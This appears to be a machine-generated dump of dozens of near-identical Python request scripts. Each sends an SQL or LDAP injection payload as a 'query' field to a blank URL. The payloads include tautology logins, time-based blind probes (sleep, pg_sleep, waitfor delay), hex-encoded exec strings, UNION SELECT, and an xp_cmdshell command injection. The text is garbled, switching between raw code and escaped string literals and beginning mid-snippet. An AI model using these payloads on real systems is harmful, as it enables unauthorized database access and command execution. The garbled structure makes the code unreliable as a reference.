                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2223 OR 1=1\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22/\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22anything' OR 'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x284000\x29 select \x40q =\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22desc\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22||'6\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x221\x29\x29 or sleep\x28__TIME__\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22select name from syscolumns where id = \x28sele ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22hi or a=a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22*\x28|\x28mail=*\x29\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22password:*/=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22distinct\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22);waitfor delay '0:0:__TIME__'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22to_timestamp_tz\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29 or benchmark\x2810000000,MD5\x281\x29\x29#\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22UNION SELECT\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%2A%28%7C%28mail%3D%2A%29%29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22+sqlvuln\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1 /*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22)) or sleep(__TIME__)='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1 or \\x22\\x22=\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1 in \x28select \x40\x40version\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22sqlvuln;\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22union select * from users where login = char ...\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' or 1=1 or 'x'='y\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x2228 %\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22â\x80\x98 or 3=3 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x40variable\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22a\\x22\\x22 or 1=1--\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22//*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22%2A%7C\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22 or 0=0 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\\x22\x29\x29 or pg_sleep\x28__TIME__\x29--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22?\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1/*\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x21\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or a = a\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 select \x40q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec\x28\x40q\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar\x28200\x29 select \x40s = 0x77616974666F722064656C61792027303A303A31302700 exec\x28\x40s\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40q nvarchar \x28200\x29 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec\x28\x40q\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22declare \x40s varchar \x28200\x29 select \x40s = 0x73656c65637420404076657273696f6e exec\x28\x40s\x29\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22\x18 or 1=1 --\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22x' OR full_name LIKE '%Bob%\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'; exec master..xp_cmdshell 'ping 172.10.1.255'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'%20or%20''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22'%20or%20'x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22')%20or%20('x'='x\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 --\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 0=0 #\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 0=0 #\\x22\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or '1'='1'--\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1 --'\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
'def main\x28\x29:\n                    url = \\x22\\x22\n                    headers = {\\x22Content-Type\\x22: \\x22application/json\\x22, \\x22Authorization\\x22: \\x22Bearer TOKEN\\x22}\n                    data = {\\x22query\\x22: \\x22or 1=1--\\x22}\n                    try:\n                        response = requests.post\x28url, headers=headers, json=data\x29\n                        response.raise_for_status\x28\x29\n                        print\x28response.status_code, end=\\x22\n\\x22\x29\n                        print\x28response.json\x28\x29\x29\n                    except requests.exceptions.RequestException as e:\n                        print\x28e\x29'
def main():
                    url = \x22\x22
                    headers = {\x22Content-Type\x22: \x22application/json\x22, \x22Authorization\x22: \x22Bearer TOKEN\x22}
                    data = {\x22query\x22: \x22' or 1=1 or ''='\x22}
                    try:
                        response = requests.post(url, headers=headers, json=data)
                        response.raise_for_status()
                        print(response.status_code, end=\x22
\x22)
                        print(response.json())
                    except requests.exceptions.RequestException as e:
                        print(e)
